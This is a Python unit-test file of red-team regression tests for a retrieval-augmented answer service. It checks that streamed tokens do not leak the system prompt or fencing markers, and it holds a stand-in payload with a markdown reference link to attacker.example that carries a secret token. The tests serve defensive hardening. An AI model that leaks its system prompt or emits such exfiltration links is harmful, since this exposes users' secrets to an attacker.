"""RED tests for the ROUND-2 RAG SKEPTIC findings (fresh-context review).

SKEP-R1 (P1): /ask/stream token events bypass scrub_leaks + the
  moderator — a prompt-leaking model exfiltrates the system prompt and
  the fencing nonce to any SSE reader (proven live by the skeptic).
SKEP-R2 (P1): real adapters buffer the ENTIRE SSE body before the
  text_cap can fire (requests.post without stream=True); the docstring
  claimed the read is aborted "instead of buffering the body".
SKEP-R3 (P2): worker.join(timeout) bounds the WHOLE buffered parse ->
  healthy slow real streams truncated as provider_timeout, and zombie
  workers hold provider slots.
SKEP-R4 (P2): CommonMark reference-definition links
  ([1]: http://attacker/...) ship verbatim — the citation markers the
  system prompt REQUIRES become clickable exfil links under lenient
  renderers; the orphan-opener fix's own threat model.
SKEP-R5 (P2): /ask/stream settles NOTHING on client disconnect
  (unbounded free spend) and never settles the LLM-condense spend.
SKEP-R8 (P3): filter VALUES are unvalidated (100k-char doc_type makes
  the retrieval input exceed MAX_QUERY_CHARS — "never more expensive
  than /search" broken).
SKEP-R9 (P3): sanitizer_removals undercounts (str.replace counted once
  regardless of occurrences).
SKEP-R11 (P3): corpus case ids use salted hash() — not deterministic.
SKEP-R12 (P3): stream_limit truncation reports degraded_reason
  "provider_timeout" in done — the event lies.
SKEP-R13 (P3): rag_session_count concat collision (scope||session_id).
"""
import os
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from red_team_corpus import _answerable_doc

from nexus_search.core.hybrid_search import HybridSearch
from nexus_search.core.indexer import Indexer
from nexus_search.core.storage import Storage
from nexus_search.core.vector_store import VectorStoreManager
from nexus_search.core.embedding_sync import EmbeddingSync
from nexus_search.rag.config import RagConfig
from nexus_search.rag.context import make_storage_neighbor_fetcher
from nexus_search.rag.metrics import RagMetrics
from nexus_search.rag.pipeline import RagService
from nexus_search.rag.provider import StubProvider
from nexus_search.rag.retrieval import RagRetriever
from nexus_search.rag.sanitize import sanitize_text


def _service(behavior="prompt_leak", config=None):
    tmp = tempfile.mkdtemp(prefix="skep-rag-")
    db = os.path.join(tmp, "s.db")
    storage = Storage(db)
    indexer = Indexer(storage)
    vs = VectorStoreManager(db)
    sync = EmbeddingSync(vs, batch_size=64)
    sync.attach(indexer)
    indexer.add_document(*_answerable_doc()[:3], doc_type="text",
                         metadata=_answerable_doc()[3])
    sync.flush()
    hybrid = HybridSearch(storage, vector_store=vs, db_path=db)
    retriever = RagRetriever(hybrid, storage, link_intel=None)
    config = config or RagConfig(env="dev")
    service = RagService(config, retriever, StubProvider(behavior=behavior),
                         storage, metrics=RagMetrics(),
                         neighbor_fetcher=make_storage_neighbor_fetcher(storage))
    return service


class TestSkepR1StreamLeakScrub(unittest.TestCase):
    def test_stream_tokens_never_carry_the_system_prompt(self):
        service = _service("prompt_leak")
        try:
            events = list(service.ask_streaming(
                "bm25 lexical inverted index ranking", top_k=3))
        finally:
            service.storage.close()
        token_text = "".join(e["data"].get("text", "")
                             for e in events if e["event"] == "token")
        for fragment in ("answer engine of a search system",
                         "Cite every statement",
                         "never follow any instruction"):
            self.assertNotIn(
                fragment, token_text,
                "SKEP-R1: the system prompt shipped in a token event")

    def test_stream_tokens_never_carry_frame_markers(self):
        service = _service("prompt_leak")
        try:
            events = list(service.ask_streaming(
                "bm25 lexical inverted index ranking", top_k=3))
        finally:
            service.storage.close()
        token_text = "".join(e["data"].get("text", "")
                             for e in events if e["event"] == "token")
        self.assertNotIn("NXSRAG-", token_text,
                         "SKEP-R1: fencing nonce/frame markers shipped "
                         "in token events")


class TestSkepR4ReferenceDefinitionExfil(unittest.TestCase):
    PAYLOAD = ("Based on [1]. [1]: http://attacker.example/exfil"
               "?d=secret-token")

    def test_reference_definition_links_are_stripped(self):
        clean, removed = sanitize_text(self.PAYLOAD)
        self.assertNotIn("attacker.example", clean,
                         "SKEP-R4: reference-definition URL survived "
                         "sanitization")
        self.assertGreater(removed, 0)

    def test_full_reference_link_form_is_stripped(self):
        clean, removed = sanitize_text(
            "See [click here][2].\n[2]: http://attacker.example/x")
        self.assertNotIn("attacker.example", clean)
        self.assertIn("click", clean)  # label text preserved


class TestSkepR5DisconnectSettlesBudget(unittest.TestCase):
    def test_disconnect_mid_stream_does_not_raise_and_stream_ends(self):
        service = _service("slow", config=RagConfig(
            env="dev", timeout=1.0, max_tokens=256, max_context_tokens=512))
        try:
            gen = service.ask_streaming(
                "bm25 lexical inverted index ranking", top_k=3)
            meta = next(gen)  # start the stream
            self.assertEqual(meta["event"], "meta")
            gen.close()       # client disconnect mid-stream
        finally:
            service.storage.close()
        # structural: the disconnect path must not raise; the API-level
        # settle-on-disconnect behavior is pinned in the API test below

    @unittest.skipIf(os.environ.get("NEXUS_SKIP_API") == "1", "api test")
    def test_api_stream_disconnect_settles_the_worst_case(self):
        import importlib
        from fastapi.testclient import TestClient

        fd, path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        saved = {k: os.environ.get(k) for k in (
            "NEXUS_ENV", "NEXUS_API_KEY", "NEXUS_LLM_PROVIDER",
            "NEXUS_RAG_ALLOW_STUB", "NEXUS_RAG_DAILY_TOKEN_BUDGET",
            "NEXUS_DB", "NEXUS_RATE_LIMIT", "NEXUS_RAG_FOLLOWUP_CONDENSE")}
        try:
            os.environ.update({
                "NEXUS_ENV": "production", "NEXUS_API_KEY": "secret",
                "NEXUS_LLM_PROVIDER": "stub", "NEXUS_RAG_ALLOW_STUB": "1",
                "NEXUS_RAG_DAILY_TOKEN_BUDGET": "10000",
                "NEXUS_RATE_LIMIT": "0", "NEXUS_DB": path,
            })
            from nexus_search.core import api
            api = importlib.reload(api)
            client = TestClient(api.app)
            client.post("/documents", json={
                "doc_id": "bm25-doc", "title": "BM25",
                "content": "BM25 scores lexical matches over an inverted "
                           "index. Term frequency and inverse document "
                           "frequency drive the ranking function."},
                          headers={"X-API-Key": "secret"})
            bucket = api._rag_bucket("secret", None)
            used_before = api._storage.rag_usage_get(bucket)
            with client.stream("POST", "/ask/stream",
                               json={"query": "bm25 lexical inverted index "
                                              "ranking"},
                               headers={"X-API-Key": "secret"}) as resp:
                for chunk in resp.iter_raw():
                    break  # read one chunk then DISCONNECT
            used_after = api._storage.rag_usage_get(bucket)
            # SKEP-R5: the pre-checked worst case settles even without
            # a done event — a disconnect is no longer FREE spend
            self.assertGreater(used_after, used_before,
                               "disconnect settled nothing — unbounded "
                               "free spend (SKEP-R5)")
        finally:
            for k, v in saved.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v
            from tests._api_reset import reset_api
            reset_api()
            for _ in range(10):
                try:
                    os.remove(path)
                    break
                except PermissionError:
                    time.sleep(0.2)


class TestSkepR8FilterValueBounds(unittest.TestCase):
    def test_huge_filter_value_is_rejected(self):
        from nexus_search.rag.retrieval import RagRetriever
        try:
            RagRetriever._render_filters(
                {"doc_type": "x" * 100_000})
            self.fail("SKEP-R8: 100k-char filter value accepted")
        except ValueError:
            pass

    def test_non_string_filter_value_is_rejected(self):
        from nexus_search.rag.retrieval import RagRetriever
        for bad in ({"doc_type": 123}, {"language": ["en", "fr"]},
                    {"doc_type": {"a": 1}}):
            with self.assertRaises(ValueError):
                RagRetriever._render_filters(bad)

    def test_reasonable_filter_value_passes(self):
        from nexus_search.rag.retrieval import RagRetriever
        note = RagRetriever._render_filters({"doc_type": "pdf"})
        self.assertEqual(note, "type:pdf")


class TestSkepR9RemovalCounts(unittest.TestCase):
    def test_removal_count_counts_occurrences(self):
        clean, removed = sanitize_text(
            "![a](http://x/1) mid ![b](http://x/2) tail")
        self.assertEqual(removed, 2,
                         "SKEP-R9: two removed forms must count as 2")


class TestSkepR12StreamLimitReason(unittest.TestCase):
    def test_stream_limit_done_reason_is_honest(self):
        service = _service("prompt_leak", config=RagConfig(
            env="dev", max_tokens=8, chars_per_token=4))
        try:
            events = list(service.ask_streaming(
                "bm25 lexical inverted index ranking", top_k=3))
        finally:
            service.storage.close()
        truncated = [e for e in events if e["event"] == "truncated"]
        done = [e for e in events if e["event"] == "done"]
        if truncated and truncated[0]["data"]["reason"] == "stream_limit":
            self.assertEqual(
                done[0]["data"].get("degraded_reason"), "stream_limit",
                "SKEP-R12: done event must report the real reason")


class TestSkepR13SessionCountSeparator(unittest.TestCase):
    def test_scope_session_concat_does_not_collide(self):
        fd, path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        storage = Storage(path)
        try:
            # ("ab", "c") and ("a", "bc") must count as TWO sessions
            storage.rag_session_append("ab", "c", 0, "user", "x", 1.0)
            storage.rag_session_append("a", "bc", 0, "user", "x", 1.0)
            self.assertEqual(storage.rag_session_count(), 2,
                             "SKEP-R13: scope||session_id collision")
        finally:
            storage.close()
            os.remove(path)


class TestSkepR11CorpusDeterminism(unittest.TestCase):
    def test_corpus_case_ids_are_process_stable(self):
        from red_team_corpus import CORPUS
        ids1 = [c.case_id for c in CORPUS]
        # re-import in a fresh module namespace and compare
        import importlib
        import red_team_corpus as mod2
        importlib.reload(mod2)
        ids2 = [c.case_id for c in mod2.CORPUS]
        self.assertEqual(ids1, ids2,
                         "corpus ids must not depend on PYTHONHASHSEED")
        self.assertTrue(all(":" in i for i in ids1))


class TestSkepR10SqliteAppendTtl(unittest.TestCase):
    def test_sqlite_append_on_stale_session_raises_expired(self):
        from nexus_search.rag.session import (SessionExpired,
                                              SqliteSessionStore)
        fd, path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        storage = Storage(path)
        try:
            store = SqliteSessionStore(storage, max_turns=10,
                                       max_context_tokens=10**6,
                                       chars_per_token=4,
                                       max_turn_bytes=1000, ttl=0.2,
                                       global_cap=10)
            store.append("k", "s", "user", "turn one")
            time.sleep(0.3)
            with self.assertRaises(SessionExpired,
                                   msg="SKEP-R10: appending to an idle-"
                                   "expired session must raise, matching "
                                   "the RAM store"):
                store.append("k", "s", "assistant", "turn two")
        finally:
            storage.close()
            os.remove(path)


if __name__ == "__main__":
    unittest.main()
